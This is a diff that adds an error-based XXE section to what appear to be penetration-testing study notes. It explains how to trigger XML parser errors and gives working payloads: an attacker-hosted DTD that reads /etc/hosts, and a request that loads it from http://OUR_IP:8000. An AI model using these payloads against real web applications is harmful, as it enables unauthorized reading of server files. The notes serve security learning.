@@ -136,6 +136,20 @@ Then reference it as an external entitiy on the target web applicaiton:
 <email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
 ```
 ### Error Based XXE
-The web application might not write any output. However, if the web application displays runtime errors (e.g., PHP errors) and does not have proper exception handling for the XML input, then we can use this flaw to read the output of the XXE exploit.
+The web application might not write any output. However, if the web application displays runtime errors (e.g., PHP errors) and does not have proper exception handling for the XML input, then we can use this flaw to read the output of the XXE exploit. <br>
+We can try to send malformed XML data, and see if the web application displays any errors. To do so, we can delete any of the closing tags, change one of them, so it does not close (e.g. <roo> instead of <root>), or just reference a non-existing entity, like `<email>&nonExistent;</email>`.
+If it diplays error, we can try creating this payload on our attacking machine:
+```
+<!ENTITY % file SYSTEM "file:///etc/hosts">
+<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
+```
+and then call this in the request:
+```
+<!DOCTYPE email [ 
+  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
+  %remote;
+  %error;
+]>
+```
 
 
